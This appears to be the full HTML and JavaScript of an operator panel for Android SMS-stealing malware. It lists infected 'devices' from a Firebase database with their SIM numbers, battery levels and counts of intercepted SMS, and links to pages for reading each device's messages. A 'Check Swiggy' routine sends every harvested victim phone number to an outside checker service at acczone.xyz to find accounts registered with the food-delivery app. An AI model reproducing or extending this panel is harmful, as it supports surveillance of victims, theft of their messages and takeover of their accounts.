<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Device Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            padding: 16px;
            min-height: 100vh;
        }
        .container {
            max-width: 700px;
            margin: 0 auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
            margin-bottom: 16px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .back-btn {
            color: #94a3b8;
            text-decoration: none;
            font-size: 0.85rem;
            padding: 6px 14px;
            border: 1px solid #334155;
            border-radius: 8px;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            touch-action: manipulation;
            min-height: 36px;
        }
        .back-btn:hover {
            border-color: #10b981;
            color: #10b981;
        }
        .search-box {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 8px 14px;
            color: #f8fafc;
            font-size: 0.85rem;
            width: 160px;
            transition: 0.3s;
            min-height: 36px;
        }
        .search-box:focus {
            outline: none;
            border-color: #10b981;
            width: 200px;
        }
        .search-box::placeholder {
            color: #64748b;
        }
        .device-grid {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .device-card {
            background-color: #1e293b;
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 14px 16px;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            justify-content: space-between;
            align-items: center;
            touch-action: manipulation;
        }
        .device-card:active {
            transform: scale(0.98);
        }
        .device-card:hover {
            border-color: #10b981;
            transform: translateX(4px);
        }
        .device-info {
            display: flex;
            flex-direction: column;
            gap: 3px;
            flex: 1;
            min-width: 0;
        }
        .device-name {
            font-size: 1rem;
            font-weight: 600;
            word-break: break-word;
        }
        .device-id {
            font-size: 0.7rem;
            color: #64748b;
            font-family: monospace;
            word-break: break-all;
        }
        .device-stats {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            font-size: 0.75rem;
            color: #94a3b8;
        }
        .device-stats span {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .charge-bar {
            display: inline-block;
            width: 40px;
            height: 5px;
            background: #334155;
            border-radius: 3px;
            overflow: hidden;
            margin-left: 2px;
        }
        .charge-fill {
            height: 100%;
            border-radius: 3px;
            transition: width 0.5s;
        }
        .charge-fill.high { background: #10b981; }
        .charge-fill.medium { background: #f59e0b; }
        .charge-fill.low { background: #ef4444; }
        .device-number {
            font-size: 0.7rem;
            color: #475569;
            min-width: 50px;
            text-align: right;
        }
        .loading {
            color: #94a3b8;
            text-align: center;
            padding: 40px;
        }
        .spinner {
            display: inline-block;
            width: 24px;
            height: 24px;
            border: 3px solid #334155;
            border-top: 3px solid #10b981;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 12px;
            vertical-align: middle;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .no-results {
            text-align: center;
            padding: 40px;
            color: #64748b;
        }
        .status-badge {
            font-size: 0.7rem;
            padding: 4px 10px;
            border-radius: 20px;
            background: #1e293b;
            color: #94a3b8;
            border: 1px solid #334155;
            white-space: nowrap;
        }
        .status-badge.live {
            color: #10b981;
            border-color: #10b981;
        }
        .delete-all {
            color: #ef4444;
            background: none;
            border: 1px solid #ef4444;
            padding: 6px 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.75rem;
            transition: 0.2s;
            min-height: 36px;
            touch-action: manipulation;
        }
        .delete-all:active {
            transform: scale(0.95);
        }
        .delete-all:hover {
            background: #ef4444;
            color: #0f172a;
        }

        /* ===== SWIGGY CHECKER STYLES ===== */
        .check-btn {
            background: #10b981;
            color: #0f172a;
            border: none;
            padding: 6px 14px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            min-height: 36px;
            touch-action: manipulation;
            white-space: nowrap;
        }
        .check-btn:active {
            transform: scale(0.95);
        }
        .check-btn:hover {
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        }
        .check-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .check-btn .spinner-small {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #0f172a;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        /* ===== RESULTS OVERLAY ===== */
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(15, 23, 42, 0.92);
            backdrop-filter: blur(4px);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .overlay.active {
            display: flex;
        }
        .results-modal {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 16px;
            max-width: 550px;
            width: 100%;
            max-height: 85vh;
            padding: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
            display: flex;
            flex-direction: column;
        }
        .results-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
            padding-bottom: 10px;
            margin-bottom: 12px;
            flex-wrap: wrap;
            gap: 6px;
        }
        .results-header h2 {
            font-size: 1rem;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .close-btn {
            background: none;
            border: none;
            color: #94a3b8;
            font-size: 1.3rem;
            cursor: pointer;
            padding: 4px 8px;
            transition: 0.2s;
            min-height: 36px;
            min-width: 36px;
            touch-action: manipulation;
        }
        .close-btn:active {
            transform: scale(0.9);
        }
        .close-btn:hover {
            color: #f8fafc;
        }
        .results-summary {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-bottom: 12px;
            padding: 10px;
            background: #0f172a;
            border-radius: 10px;
        }
        .results-summary .stat {
            text-align: center;
        }
        .results-summary .stat .number {
            font-size: 1.2rem;
            font-weight: 700;
        }
        .results-summary .stat .label {
            font-size: 0.6rem;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }
        .results-summary .stat .number.green { color: #10b981; }
        .results-summary .stat .number.red { color: #ef4444; }
        .results-summary .stat .number.gray { color: #64748b; }
        
        .results-list {
            overflow-y: auto;
            flex: 1;
            padding-right: 4px;
        }
        .results-list::-webkit-scrollbar {
            width: 4px;
        }
        .results-list::-webkit-scrollbar-track {
            background: #0f172a;
            border-radius: 2px;
        }
        .results-list::-webkit-scrollbar-thumb {
            background: #334155;
            border-radius: 2px;
        }
        .result-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 6px 10px;
            border-bottom: 1px solid #2d3a4f;
            font-size: 0.8rem;
            gap: 8px;
        }
        .result-item:last-child {
            border-bottom: none;
        }
        .result-item .phone {
            font-family: monospace;
            color: #94a3b8;
            font-size: 0.75rem;
            word-break: break-all;
        }
        .result-item .status {
            font-weight: 600;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 0.65rem;
            white-space: nowrap;
        }
        .result-item .status.registered {
            background: rgba(16, 185, 129, 0.15);
            color: #10b981;
        }
        .result-item .status.not-registered {
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
        }
        .result-item .status.checking {
            background: rgba(245, 158, 11, 0.15);
            color: #f59e0b;
        }
        .result-item .status.error {
            background: rgba(100, 116, 139, 0.15);
            color: #64748b;
        }
        .result-item .device-name-tag {
            font-size: 0.6rem;
            color: #475569;
            max-width: 80px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .progress-bar {
            width: 100%;
            height: 3px;
            background: #2d3a4f;
            border-radius: 2px;
            margin: 6px 0 12px 0;
            overflow: hidden;
        }
        .progress-bar .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #10b981, #3b82f6);
            border-radius: 2px;
            transition: width 0.3s ease;
            width: 0%;
        }
        .progress-text {
            text-align: center;
            font-size: 0.75rem;
            color: #94a3b8;
            margin-bottom: 4px;
        }
        
        .header-actions {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }

        @media (max-width: 480px) {
            body { padding: 12px; }
            .header { flex-direction: column; align-items: stretch; gap: 8px; }
            .header-left { justify-content: space-between; }
            .header-actions { flex-wrap: wrap; }
            .search-box { width: 100%; }
            .results-modal { padding: 14px; max-height: 90vh; }
            .results-summary { grid-template-columns: repeat(3, 1fr); gap: 4px; padding: 6px; }
            .results-summary .stat .number { font-size: 1rem; }
            .result-item { font-size: 0.7rem; padding: 4px 6px; flex-wrap: wrap; }
            .result-item .device-name-tag { max-width: 60px; }
            .device-card { padding: 12px; flex-direction: column; align-items: stretch; gap: 6px; }
            .device-number { text-align: left; }
            .device-stats { gap: 6px; font-size: 0.65rem; }
            .charge-bar { width: 30px; }
        }

        @media (max-width: 380px) {
            .result-item .device-name-tag { display: none; }
            .check-btn { font-size: 0.7rem; padding: 4px 10px; }
            .delete-all { font-size: 0.65rem; padding: 4px 10px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-left">
                <a href="index.html" class="back-btn">← Back</a>
                <span style="font-weight: 600;">📋 Devices</span>
                <span id="device-count" class="status-badge">0</span>
            </div>
            <div class="header-actions">
                <button class="check-btn" id="checkSwiggyBtn" onclick="startSwiggyCheck()">
                    🔍 Check Swiggy
                </button>
                <input type="text" id="searchInput" class="search-box" placeholder="🔍 Search device..." oninput="filterDevices()">
                <button class="delete-all" onclick="deleteAllDevices()">🗑️ Delete</button>
            </div>
        </div>

        <div id="device-container">
            <div class="loading">
                <span class="spinner"></span>
                Loading devices...
            </div>
        </div>
    </div>

    <!-- ===== RESULTS OVERLAY ===== -->
    <div class="overlay" id="resultsOverlay">
        <div class="results-modal">
            <div class="results-header">
                <h2>📱 Swiggy Registration Status</h2>
                <button class="close-btn" onclick="closeResults()">✕</button>
            </div>
            
            <div class="progress-text" id="progressText">Preparing...</div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>

            <div class="results-summary" id="resultsSummary">
                <div class="stat">
                    <div class="number gray" id="totalCount">0</div>
                    <div class="label">Total</div>
                </div>
                <div class="stat">
                    <div class="number green" id="registeredCount">0</div>
                    <div class="label">Registered</div>
                </div>
                <div class="stat">
                    <div class="number red" id="notRegisteredCount">0</div>
                    <div class="label">Not Registered</div>
                </div>
            </div>

            <div class="results-list" id="resultsList">
                <div style="text-align:center;color:#64748b;padding:20px;font-size:0.85rem;">
                    Click "Check Swiggy" to start
                </div>
            </div>
        </div>
    </div>

    <script>
        let allDevices = [];
        let allSmsData = {};
        let isChecking = false;

        // ===== EXISTING FUNCTIONS =====
        async function loadData() {
            try {
                const [usersRes, smsRes] = await Promise.all([
                    fetch('https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/users.json'),
                    fetch('https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/common/smsData.json')
                ]);

                const usersData = await usersRes.json();
                const smsData = await smsRes.json();

                allSmsData = smsData || {};

                if (!usersData) {
                    document.getElementById('device-container').innerHTML = '<div class="no-results">No devices found</div>';
                    return;
                }

                allDevices = Object.values(usersData)
                    .filter(d => d.device_id)
                    .map(d => ({
                        ...d,
                        lastSeen: d.time || d.count || 'N/A',
                        joined: d.count || d.time || 'N/A'
                    }))
                    .sort((a, b) => {
                        if (a.lastSeen > b.lastSeen) return -1;
                        if (a.lastSeen < b.lastSeen) return 1;
                        return 0;
                    });

                renderDevices(allDevices);

            } catch (error) {
                console.error('Error loading data:', error);
                document.getElementById('device-container').innerHTML = 
                    `<div class="no-results">❌ Error loading: ${error.message}</div>`;
            }
        }

        function renderDevices(devices) {
            const container = document.getElementById('device-container');
            document.getElementById('device-count').textContent = `${devices.length} devices`;

            if (devices.length === 0) {
                container.innerHTML = '<div class="no-results">No devices match your search</div>';
                return;
            }

            let html = '<div class="device-grid">';
            let count = allDevices.length;

            devices.forEach((device, index) => {
                const charge = device.charge || 0;
                const chargeClass = charge >= 60 ? 'high' : charge >= 30 ? 'medium' : 'low';
                
                const deviceMessages = Object.values(allSmsData)
                    .filter(sms => sms.deviceId === device.device_id);
                const msgCount = deviceMessages.length;

                const sim1 = device.Sim1 || 'No SIM';
                const sim2 = device.Sim2 || 'No SIM';
                const displayNumber = sim1 !== 'Insert SIM card!' && sim1 !== 'Number not available' 
                    ? sim1 
                    : (sim2 !== 'Insert SIM card!' && sim2 !== 'Number not available' ? sim2 : 'No Number');

                html += `
                    <div class="device-card" onclick="showDeviceMessages('${device.device_id}')">
                        <div class="device-info">
                            <div class="device-name">${device.device_name || 'Unknown Device'}</div>
                            <div class="device-id">📱 ${device.device_id}</div>
                            <div class="device-stats">
                                <span>🔋 ${charge}% 
                                    <span class="charge-bar">
                                        <span class="charge-fill ${chargeClass}" style="width:${charge}%"></span>
                                    </span>
                                </span>
                                <span>📨 ${msgCount}</span>
                                <span>📞 ${displayNumber}</span>
                                <span>🕐 ${device.lastSeen}</span>
                            </div>
                        </div>
                        <div class="device-number">No. ${count - index}</div>
                    </div>
                `;
            });

            html += '</div>';
            container.innerHTML = html;
        }

        function filterDevices() {
            const query = document.getElementById('searchInput').value.toLowerCase();
            const filtered = allDevices.filter(d => 
                (d.device_name || '').toLowerCase().includes(query) ||
                (d.device_id || '').toLowerCase().includes(query) ||
                (d.Sim1 || '').includes(query) ||
                (d.Sim2 || '').includes(query)
            );
            renderDevices(filtered);
        }

        function showDeviceMessages(deviceId) {
            window.location.href = `device-sms.html?device=${deviceId}`;
        }

        function deleteAllDevices() {
            if (confirm('⚠️ Delete ALL devices? This cannot be undone!')) {
                if (confirm('Are you absolutely sure?')) {
                    fetch('https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/users.json', {
                        method: 'DELETE'
                    }).then(() => {
                        alert('✅ All devices deleted!');
                        location.reload();
                    }).catch(err => {
                        alert('❌ Error: ' + err.message);
                    });
                }
            }
        }

        // ===== SWIGGY CHECKER FUNCTIONS =====
        function getPhoneNumbersWithDeviceInfo() {
            const items = [];
            const seenNumbers = new Set();
            
            allDevices.forEach(device => {
                const sim1 = device.Sim1 || '';
                const sim2 = device.Sim2 || '';
                const deviceName = device.device_name || 'Unknown';
                const lastSeen = device.lastSeen || 'N/A';
                
                // Process SIM1
                if (sim1 && sim1 !== 'Insert SIM card!' && sim1 !== 'Number not available' && sim1 !== 'No SIM') {
                    let clean = sim1.replace(/[\s\-\(\)]/g, '');
                    if (clean.startsWith('+91')) clean = clean.substring(3);
                    if (clean.startsWith('91') && clean.length > 10) clean = clean.substring(2);
                    if (clean.length >= 10 && !seenNumbers.has(clean)) {
                        seenNumbers.add(clean);
                        items.push({ number: clean, deviceName, lastSeen, sim: 'SIM1' });
                    }
                }
                
                // Process SIM2
                if (sim2 && sim2 !== 'Insert SIM card!' && sim2 !== 'Number not available' && sim2 !== 'No SIM') {
                    let clean = sim2.replace(/[\s\-\(\)]/g, '');
                    if (clean.startsWith('+91')) clean = clean.substring(3);
                    if (clean.startsWith('91') && clean.length > 10) clean = clean.substring(2);
                    if (clean.length >= 10 && !seenNumbers.has(clean)) {
                        seenNumbers.add(clean);
                        items.push({ number: clean, deviceName, lastSeen, sim: 'SIM2' });
                    }
                }
            });
            
            return items;
        }

        async function checkSwiggyNumber(number) {
            try {
                const response = await fetch(`https://acczone.xyz/checker/swiggy.php?number=${number}`);
                const text = await response.text();
                if (text.toLowerCase().includes('number is registered')) {
                    return { number, status: 'registered' };
                } else if (text.toLowerCase().includes('number not registered')) {
                    return { number, status: 'not-registered' };
                } else {
                    return { number, status: 'error' };
                }
            } catch (error) {
                return { number, status: 'error' };
            }
        }

        async function startSwiggyCheck() {
            if (isChecking) return;
            
            const btn = document.getElementById('checkSwiggyBtn');
            const overlay = document.getElementById('resultsOverlay');
            const list = document.getElementById('resultsList');
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            
            // Get numbers with device info, sorted by lastSeen (most recent first)
            const items = getPhoneNumbersWithDeviceInfo();
            
            // Sort by lastSeen (most recent first)
            items.sort((a, b) => {
                if (a.lastSeen > b.lastSeen) return -1;
                if (a.lastSeen < b.lastSeen) return 1;
                return 0;
            });
            
            if (items.length === 0) {
                alert('No valid phone numbers found in devices.');
                return;
            }

            // Show overlay
            isChecking = true;
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner-small"></span> Checking...';
            overlay.classList.add('active');
            
            // Reset results
            list.innerHTML = '';
            document.getElementById('totalCount').textContent = items.length;
            document.getElementById('registeredCount').textContent = '0';
            document.getElementById('notRegisteredCount').textContent = '0';
            
            let registered = 0;
            let notRegistered = 0;
            let checked = 0;

            // Process numbers with 100ms delay
            for (let i = 0; i < items.length; i++) {
                const item = items[i];
                const { number, deviceName, lastSeen } = item;
                
                // Update progress
                const progress = ((i + 1) / items.length) * 100;
                progressFill.style.width = `${progress}%`;
                progressText.textContent = `Checking ${i + 1}/${items.length}... (${deviceName})`;
                
                // Show checking status
                const resultItem = document.createElement('div');
                resultItem.className = 'result-item';
                resultItem.id = `result-${i}`;
                resultItem.innerHTML = `
                    <span class="phone">+91 ${number}</span>
                    <span class="device-name-tag" title="${deviceName}">${deviceName}</span>
                    <span class="status checking">⏳ Checking...</span>
                `;
                list.appendChild(resultItem);

                // Check the number
                const result = await checkSwiggyNumber(number);
                
                // Update the item
                const statusEl = resultItem.querySelector('.status');
                if (result.status === 'registered') {
                    statusEl.className = 'status registered';
                    statusEl.textContent = '✅ Registered';
                    registered++;
                } else if (result.status === 'not-registered') {
                    statusEl.className = 'status not-registered';
                    statusEl.textContent = '❌ Not Registered';
                    notRegistered++;
                } else {
                    statusEl.className = 'status error';
                    statusEl.textContent = '⚠️ Error';
                }
                
                checked++;
                document.getElementById('registeredCount').textContent = registered;
                document.getElementById('notRegisteredCount').textContent = notRegistered;
                
                // Auto-scroll to show latest
                if (i > 0 && i % 3 === 0) {
                    resultItem.scrollIntoView({ behavior: 'smooth', block: 'end' });
                }
                
                // ✅ 100ms delay between requests
                await new Promise(resolve => setTimeout(resolve, 100));
            }

            // Complete
            progressFill.style.width = '100%';
            progressText.textContent = `✅ Complete! Checked ${checked} numbers`;
            
            isChecking = false;
            btn.disabled = false;
            btn.innerHTML = '🔍 Check Swiggy';
        }

        function closeResults() {
            document.getElementById('resultsOverlay').classList.remove('active');
            if (isChecking) {
                isChecking = false;
                const btn = document.getElementById('checkSwiggyBtn');
                btn.disabled = false;
                btn.innerHTML = '🔍 Check Swiggy';
            }
        }

        // ===== LOAD ON PAGE LOAD =====
        loadData();
        setInterval(loadData, 30000);

        // Close overlay on Escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeResults();
        });

        // Close overlay on backdrop click
        document.getElementById('resultsOverlay').addEventListener('click', (e) => {
            if (e.target === e.currentTarget) closeResults();
        });
    </script>
</body>
</html>
